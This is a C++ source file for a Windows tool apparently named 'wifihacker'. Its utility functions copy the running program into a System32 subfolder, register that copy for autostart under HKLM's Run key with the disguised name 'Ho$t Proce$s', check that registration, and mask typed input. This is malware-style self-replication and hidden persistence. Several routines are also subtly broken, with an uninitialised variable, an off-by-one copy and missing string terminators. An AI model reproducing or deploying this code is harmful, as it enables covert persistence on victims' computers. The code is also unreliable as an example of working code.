#include "Utilities.h"
#include <tchar.h>
#include <stdio.h>
#include <conio.h>
#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
using namespace std;
using namespace kosmaz;
                       
bool Utilities::Am_I_Registered(PCWSTR pszAppName)
{
 HKEY hKey=NULL;
 LONG lResult=0;
 bool fSuccess=true;
 DWORD dwRegType=REG_SZ;
 wchar_t szPathToExe[MAX_PATH]={};
 DWORD dwSize=sizeof(szPathToExe);
 lResult=RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hKey);
 fSuccess=(lResult==0);
 
 if(fSuccess)
  {
   lResult=RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
   fSuccess=(lResult==0);
  }
  
  if(fSuccess)
   {
   	fSuccess=(wcslen(szPathToExe)>0)? true:false;
   }
  
  if(hKey!=NULL)
   {
   	RegCloseKey(hKey);
   	hKey=NULL;
   }
  return fSuccess;    
}


char* Utilities::Replicate_Self()
{
 DWORD pathlen=0;
 TCHAR temp[MAX_PATH];
 pathlen=GetModuleFileName(NULL, temp, MAX_PATH);
 if(pathlen==0)
   {
   	_tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
   	system("pause");
   	return 0;
   }
  string szpath=temp;
  string newpath=" C:\\Windows\\System32\\slmgr\\";
  string copied="copy ";
  copied+=szpath;
  copied+=newpath;
  char __array_copied__[copied.size()];
  (void) copied.copy(__array_copied__, copied.size());
  system(__array_copied__);
  newpath+="wifihacker.exe";
  char* _array_=new char[newpath.size()];
  (void)newpath.copy(_array_, newpath.size(), 1);
  return _array_;
} 


bool Utilities::Write_To_Registry()
{
//check whether program is registered and if yes return to caller
if(Am_I_Registered(L"Ho$t Proce$s"))
   return true;
   
//replicate self    
  char* _array_=Replicate_Self();
  
  if(_array_==0)
  {
   _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
   system("pause");
   return false;
  }
    
  TCHAR szPath[strlen(_array_)];
  for(unsigned i=0; i<strlen(_array_); i++)
    szPath[i]='\0';
	  
  for(unsigned i=0; i<strlen(_array_); i++)
  	  szPath[i]=_array_[i];
  	    
  delete _array_;

//write to registry  
   DWORD pathlen=strlen(szPath);
   HKEY newvalue;
   
   if(RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newvalue)!=ERROR_SUCCESS)
     {
      _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
      system("pause");
      return false;
     }
                       
  DWORD pathLenInBytes=pathlen*sizeof(*szPath);
  if(RegSetValueEx(newvalue, TEXT("Ho$t Proce$s"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes)!=ERROR_SUCCESS)
    {
     RegCloseKey(newvalue);
     _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
     system("pause");
     return false;  
    }	 
	
   RegCloseKey(newvalue);
   return true;		    
}

char* Utilities::hide_user_input()
{
  char* key=new char[30];
  char temp_char[2],key_char;
  for(unsigned i=0; i<30; i++)
    key[i]='\0';
  for(unsigned j=0; j<2; j++)
    temp_char[j]='\0';
  while(key_char!=13)	//13==enter
    {
     key_char=getch();
     if(key_char==8)	//8==backspace
       {
       	key[strlen(key)-1]='\0';
       	system("cls");
       	for(unsigned k=0; k<strlen(key); k++)
       	  std::cout<<'*';
   	    continue;
       }
     std::cout<<'*'; 		
	 temp_char[0]=key_char;
	 strcat(key, temp_char); 
    }
  	return key;     
}

